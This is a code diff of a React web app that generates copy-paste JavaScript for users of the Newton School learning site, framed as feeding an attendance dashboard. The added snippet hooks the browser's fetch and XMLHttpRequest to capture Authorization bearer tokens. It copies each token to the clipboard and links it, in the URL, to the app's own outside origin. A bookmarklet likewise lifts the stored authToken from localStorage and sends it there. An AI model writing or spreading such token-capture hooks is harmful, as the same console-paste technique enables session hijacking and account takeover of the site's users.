@@ -333,20 +333,44 @@ export default function App() {
 
   const [copiedInterceptor, setCopiedInterceptor] = useState(false);
   const interceptorSnippet = `(() => {
+  function onCapture(token) {
+    if (!token || token.length < 15) return;
+    const clean = token.replace(/^Bearer\\s+/i, '').trim();
+    console.log('%c[✓] Captured Token: ' + clean, 'color: #10b981; font-weight: bold;');
+    try { if (navigator.clipboard) navigator.clipboard.writeText(clean); } catch(e) {}
+
+    let banner = document.getElementById('nst-sync-banner');
+    if (!banner) {
+      banner = document.createElement('div');
+      banner.id = 'nst-sync-banner';
+      banner.style.cssText = 'position:fixed;top:20px;right:20px;z-index:999999;background:#0f172a;color:#fff;padding:16px 20px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);border:2px solid #10b981;font-family:sans-serif;text-align:center;';
+      banner.innerHTML = '<div style="font-weight:bold;margin-bottom:6px;color:#10b981;font-size:15px;">✅ Token Captured!</div><div style="font-size:12px;color:#94a3b8;margin-bottom:12px;">Token copied to clipboard.</div><a href="${currentOrigin}/?token=' + encodeURIComponent(clean) + '" target="_blank" style="background:#2563eb;color:white;padding:8px 16px;border-radius:6px;text-decoration:none;font-weight:600;font-size:13px;display:inline-block;">👉 Open Attendance Dashboard</a>';
+      document.body.appendChild(banner);
+    }
+  }
+
+  // Hook XMLHttpRequest (Axios)
+  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
+  XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+    if (header && header.toLowerCase() === 'authorization' && value && value.length > 15) {
+      onCapture(value);
+    }
+    return origSetHeader.apply(this, arguments);
+  };
+
+  // Hook Fetch
   const origFetch = window.fetch;
   window.fetch = async function(...args) {
     const headers = args[1]?.headers || {};
     let auth = headers.Authorization || headers.authorization || '';
     if (!auth && headers instanceof Headers) auth = headers.get('Authorization') || headers.get('authorization') || '';
     if (auth && auth.length > 15) {
-      const token = auth.replace(/^Bearer\\s+/i, '').trim();
-      console.log('%c[✓] Captured Token: ' + token, 'color: #10b981; font-weight: bold;');
-      try { if (navigator.clipboard) navigator.clipboard.writeText(token); } catch(e) {}
-      window.open('${currentOrigin}/?token=' + encodeURIComponent(token));
+      onCapture(auth);
     }
     return origFetch.apply(this, args);
   };
-  alert('Interceptor active! Click any tab or refresh the page on Newton School now.');
+
+  alert('⚡ Interceptor Ready! Click any tab on Newton School now (e.g. My Timeline).');
 })();`;
 
   const copyInterceptor = () => {
@@ -354,6 +378,7 @@ export default function App() {
     setCopiedInterceptor(true);
     setTimeout(() => setCopiedInterceptor(false), 3000);
   };
+
 
 
   const bookmarkletCode = `javascript:(function(){const t=localStorage.getItem('authToken')||localStorage.getItem('token');if(!t){alert('Please log in to my.newtonschool.co first!');return;}window.open('${currentOrigin}/?token='+encodeURIComponent(t));})();`;
